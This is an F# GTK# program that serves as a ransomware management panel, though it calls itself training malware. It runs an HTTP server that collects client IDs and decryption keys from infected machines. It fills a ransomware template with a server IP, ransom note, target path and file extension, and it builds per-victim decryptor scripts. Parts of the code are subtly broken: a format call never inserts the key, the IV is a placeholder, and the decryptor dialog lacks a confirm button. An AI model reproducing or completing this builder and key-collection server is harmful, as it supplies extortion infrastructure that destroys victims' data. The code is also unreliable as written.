open System
open System.IO
open System.Security.Cryptography
open Gtk
open System.Net

// Define a mutable variable to track if the server is running
let mutable serverRunning = false
let mutable listener : HttpListener option = None

// Define a mutable list to store client IDs and keys
let mutable clientKeys = []

// Function to update the client list in the GUI
let updateClientList (listStore: ListStore) =
    listStore.Clear() // Clear existing entries
    for (authorizedBy, clientId, key) in clientKeys do
        listStore.AppendValues([| authorizedBy :> obj; clientId :> obj; key :> obj |]) |> ignore

// Function to start the HTTP listener
let startHttpListener (port: int) (listStore: ListStore) (decryptorListStore: ListStore) =
    if serverRunning then
        printfn "Server is already running"
    else
        try
            let newListener = new HttpListener()
            newListener.Prefixes.Add(sprintf "http://+:%d/" port)
            newListener.Start()
            listener <- Some(newListener)
            serverRunning <- true
            printfn "HTTP listener started on port %d" port

            let rec listenLoop () =
                async {
                    let! context = newListener.GetContextAsync() |> Async.AwaitTask
                    let request = context.Request
                    use reader = new StreamReader(request.InputStream)
                    let data = reader.ReadToEnd()

                    // Parse the client ID, decryption key, and authorizedBy from the request
                    let parts = data.Split(',')
                    if parts.Length = 3 then
                        let authorizedBy = parts.[0].Split('=')[1]
                        let clientId = parts.[1].Split('=')[1]
                        let key = parts.[2].Split('=')[1]

                        // Add client ID, key, and authorizedBy to the mutable list
                        clientKeys <- (authorizedBy, clientId, key) :: clientKeys

                        // Log the received data to log.txt
                        File.AppendAllText("log.txt", sprintf "AuthorizedBy=%s,ID=%s,Key=%s\n" authorizedBy clientId key)

                        // Print to terminal
                        printfn "Received: Authorized by = %s, Client ID = %s, Key = %s" authorizedBy clientId key

                        // Ensure that the update happens on the main GTK thread
                        GLib.Idle.Add(fun () -> 
                            updateClientList(listStore) |> ignore
                            printfn "Client list updated and TreeView should now display"

                            // Populate the decryptor list as well
                            decryptorListStore.Clear()
                            for (_, clientId, key) in clientKeys do
                                decryptorListStore.AppendValues([| clientId :> obj; key :> obj |]) |> ignore
                            false
                        ) |> ignore

                    // Respond to the client
                    let response = context.Response
                    let buffer = System.Text.Encoding.UTF8.GetBytes("Received")
                    response.OutputStream.Write(buffer, 0, buffer.Length)
                    response.Close()

                    return! listenLoop ()
                }
            listenLoop () |> Async.Start
        with
        | ex -> printfn "Error starting server: %s" ex.Message

// Function to stop the HTTP listener
let stopHttpListener () =
    match listener with
    | Some l -> 
        l.Stop()
        listener <- None
        serverRunning <- false
        printfn "HTTP listener stopped"
    | None -> printfn "No listener to stop"

// Function to modify the ransomware script
let modifyRansomwareScript templatePath outputPath serverIp noteFile message pathToEncrypt excludeExtensions customExtension =
    let scriptContent = File.ReadAllText(templatePath)
    let modifiedScript =
        scriptContent
            .Replace("[SERVER_IP]", serverIp)
            .Replace("[NOTE_FILE]", noteFile)
            .Replace("[MESSAGE]", message)
            .Replace("[PATH_TO_ENCRYPT]", pathToEncrypt)
            .Replace("[EXCLUDE_EXTENSIONS]", excludeExtensions)
            .Replace("[CUSTOM_EXTENSION]", customExtension)
    File.WriteAllText(outputPath, modifiedScript)
    printfn "Modified ransomware script saved to %s" outputPath

// Function to generate the decryptor
let generateDecryptor (clientId: string, decryptionKey: string) =
    // Generate the decryption script as a string
    let decryptorScript = 
        """
open System
open System.IO
open System.Security.Cryptography

// AES Decryption function
let decryptFile (filePath: string, key: byte[], iv: byte[]) =
    let aes = Aes.Create()
    aes.Key <- key
    aes.IV <- iv

    // Set output path with original extension
    let decryptedFilePath = Path.ChangeExtension(filePath, null)

    use fsInput = new FileStream(filePath, FileMode.Open, FileAccess.Read)
    use fsOutput = new FileStream(decryptedFilePath, FileMode.Create, FileAccess.Write)
    use cryptoStream = new CryptoStream(fsInput, aes.CreateDecryptor(), CryptoStreamMode.Read)

    let buffer = Array.zeroCreate<byte> 1024
    let mutable bytesRead = 0

    while (bytesRead <- cryptoStream.Read(buffer, 0, buffer.Length)) > 0 do
        fsOutput.Write(buffer, 0, bytesRead)

    fsInput.Close()
    File.Delete(filePath) // Delete the encrypted file
    printfn "Decrypted and restored file: %s -> %s" filePath decryptedFilePath

// Start decryption process
let startDecryption () =
    let key = Convert.FromBase64String("%s")
    let iv = Convert.FromBase64String("IV_PLACEHOLDER") // Set the correct IV
    let files = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.training", SearchOption.AllDirectories)
    for file in files do
        decryptFile(file, key, iv)

startDecryption()
""" 

    // Format the script with the client-specific decryption key
    let formattedScript = String.Format(decryptorScript, decryptionKey)

    // Save the generated decryptor to a file
    let decryptorFilePath : string = sprintf "./Generated/decryptor_%s.fsx" clientId
    File.WriteAllText(decryptorFilePath, formattedScript)
    printfn "Decryptor script generated: %s" decryptorFilePath


// Create the GTK# GUI
[<EntryPoint>]
let main argv =
    Application.Init()

    // Create the main window
    let window = new Window("Management GUI")
    window.SetDefaultSize(600, 400)
    window.DeleteEvent.Add(fun _ -> Application.Quit())

    // Create a vertical box to contain all widgets
    let vbox = new VBox()

    // Create a list store to hold authorized by, client ID, and key pairs
    let listStore = new ListStore(typeof<string>, typeof<string>, typeof<string>)
    let decryptorListStore = new ListStore(typeof<string>, typeof<string>)

    // Create a button to start/stop the server
    let serverButton = new Button("Start Server")
    serverButton.ModifyBg(StateType.Normal, new Gdk.Color(0uy, 255uy, 0uy)) // Green background for Start
    serverButton.Clicked.Add(fun _ ->
        if not serverRunning then
            // Start the server
            startHttpListener 8080 listStore decryptorListStore
            serverButton.Label <- "Stop Server"
            serverButton.ModifyBg(StateType.Normal, new Gdk.Color(255uy, 0uy, 0uy)) // Red background for Stop
            serverRunning <- true
        else
            // Stop the server
            stopHttpListener()
            serverButton.Label <- "Start Server"
            serverButton.ModifyBg(StateType.Normal, new Gdk.Color(0uy, 255uy, 0uy)) // Green background for Start
            serverRunning <- false
    )
    vbox.PackStart(serverButton, false, false, 10u)

    // Create a tree view to display authorized by, client IDs, and keys
    let treeView = new TreeView(listStore)
    treeView.Selection.Mode <- SelectionMode.Single

    // Add a column for Authorized By
    let authorizedByColumn = new TreeViewColumn("Authorized By", new CellRendererText(), "text", 0)
    treeView.AppendColumn(authorizedByColumn)

    // Add a column for Client ID
    let clientIdColumn = new TreeViewColumn("Client ID", new CellRendererText(), "text", 1)
    treeView.AppendColumn(clientIdColumn)

    // Add a column for Decryption Key
    let keyColumn = new TreeViewColumn("Decryption Key", new CellRendererText(), "text", 2)
    treeView.AppendColumn(keyColumn)

    // Add the tree view to the window
    vbox.PackStart(treeView, true, true, 0u)

    // Add the "Delete Selected" button
    let deleteButton = new Button("Delete Selected")
    deleteButton.Clicked.Add(fun _ ->
        let selection = treeView.Selection
        let success, iter = selection.GetSelected()
        if success then
            let clientId = listStore.GetValue(iter, 1) :?> string // Cast to string
            let key = listStore.GetValue(iter, 2) :?> string // Cast to string
            printfn "Deleting: Client ID = %s, Key = %s" clientId key

            // Remove the selected client ID and key from the list
            clientKeys <- clientKeys |> List.filter (fun (_, id, _) -> id <> clientId)
            updateClientList(listStore) // Refresh the list after deletion
        else
            printfn "No row selected"
    )
    vbox.PackStart(deleteButton, false, false, 10u)

    // Add the "Generate Training Malware" button
    let generateButton = new Button("Generate Training Malware")
    generateButton.Clicked.Add(fun _ ->
        // Create a dialog to collect malware options
        let dialog = new Dialog("Generate Training Malware", window, DialogFlags.Modal)
        dialog.SetDefaultSize(400, 300)

        // Add input fields to the dialog
        let serverIpEntry = new Entry() // Server IP
        let noteFileEntry = new Entry() // Note file name
        let messageEntry = new Entry() // Message
        let pathToEncryptEntry = new Entry() // Path to encrypt
        let excludeExtensionsEntry = new Entry() // Exclude extensions
        let customExtensionEntry = new Entry() // Custom extension

        // Add a confirmation button to the dialog
        dialog.AddButton("Generate", ResponseType.Accept) |> ignore

        // Display the dialog
        dialog.ContentArea.PackStart(new Label("Server IP:"), false, false, 0u)
        dialog.ContentArea.PackStart(serverIpEntry, false, false, 0u)
        dialog.ContentArea.PackStart(new Label("Note File Name:"), false, false, 0u)
        dialog.ContentArea.PackStart(noteFileEntry, false, false, 0u)
        dialog.ContentArea.PackStart(new Label("Message:"), false, false, 0u)
        dialog.ContentArea.PackStart(messageEntry, false, false, 0u)
        dialog.ContentArea.PackStart(new Label("Path to Encrypt:"), false, false, 0u)
        dialog.ContentArea.PackStart(pathToEncryptEntry, false, false, 0u)
        dialog.ContentArea.PackStart(new Label("Exclude Sensitive Files (extensions):"), false, false, 0u)
        dialog.ContentArea.PackStart(excludeExtensionsEntry, false, false, 0u)
        dialog.ContentArea.PackStart(new Label("Custom Extension:"), false, false, 0u)
        dialog.ContentArea.PackStart(customExtensionEntry, false, false, 0u)
        dialog.ShowAll()

        let response = dialog.Run()
        if response = int ResponseType.Accept then
            let serverIp = serverIpEntry.Text
            let noteFile = noteFileEntry.Text
            let message = messageEntry.Text
            let pathToEncrypt = pathToEncryptEntry.Text
            let excludeExtensions = excludeExtensionsEntry.Text
            let customExtension = customExtensionEntry.Text

            let templatePath = "./Templates/template_ransomware.fsx"
            let outputPath = "./Generated/malware_simulation.fsx"

            modifyRansomwareScript templatePath outputPath serverIp noteFile message pathToEncrypt excludeExtensions customExtension
        dialog.Destroy()
    )
    vbox.PackStart(generateButton, false, false, 10u)

    // Add the "Generate Decryptor" button
    let decryptButton = new Button("Generate Decryptor")
    decryptButton.Clicked.Add(fun _ ->
        let dialog = new Dialog("Generate Decryptor", window, DialogFlags.Modal)
        dialog.SetDefaultSize(300, 200)

        let decryptorTreeView = new TreeView(decryptorListStore)
        let clientIdColumn = new TreeViewColumn("Client ID", new CellRendererText(), "text", 0)
        let keyColumn = new TreeViewColumn("Decryption Key", new CellRendererText(), "text", 1)
        decryptorTreeView.AppendColumn(clientIdColumn)
        decryptorTreeView.AppendColumn(keyColumn)

        let contentArea = dialog.ContentArea
        contentArea.PackStart(new Label("Select Client ID:"), false, false, 0u)
        contentArea.PackStart(decryptorTreeView, true, true, 0u)
        dialog.ShowAll()

        let response = dialog.Run()
        if response = int ResponseType.Accept then
            let selection = decryptorTreeView.Selection
            let success, iter = selection.GetSelected()
            if success then
                let selectedClientId = decryptorListStore.GetValue(iter, 0) :?> string
                let selectedKey = decryptorListStore.GetValue(iter, 1) :?> string

                // Debugging: Print the selected client ID and key
                printfn "Selected Client ID: %s, Decryption Key: %s" selectedClientId selectedKey

                // Generate the decryption executable based on the selected Client ID and key
                generateDecryptor(selectedClientId, selectedKey)
        dialog.Destroy()
    )
    vbox.PackStart(decryptButton, false, false, 10u)

    // Add the vertical box to the window
    window.Add(vbox)

    // Show all components
    window.ShowAll()
    Application.Run()

    0
